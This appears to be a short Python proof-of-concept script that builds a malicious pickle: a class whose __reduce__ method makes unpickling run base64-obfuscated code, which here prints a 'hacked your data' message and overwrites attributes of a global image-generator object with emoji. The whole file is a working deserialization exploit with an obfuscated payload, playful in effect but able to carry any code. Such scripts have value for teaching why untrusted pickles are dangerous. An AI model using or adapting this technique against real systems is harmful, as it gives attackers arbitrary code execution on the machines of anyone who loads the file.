import pickle
import base64

hack_string="""
print("I CAN HAZ CHEESEBURGER. Also I hacked your data.")
if 'imagegen_loaded' in globals():
    image_to_hack = globals()['imagegen_loaded']
    for i, name in enumerate(image_to_hack.__dict__):
        setattr(image_to_hack, name, '🐈' if i%2==0 else '🍔')
"""
hack_string_encoded = base64.b64encode(hack_string.encode())

hack_string2="""
import base64
exec(base64.b64decode({}))
""".format(hack_string_encoded)

class Sneaky:
    def __reduce__(self):
        return (exec, (hack_string2,))

payload = pickle.dumps(Sneaky())
print(payload)
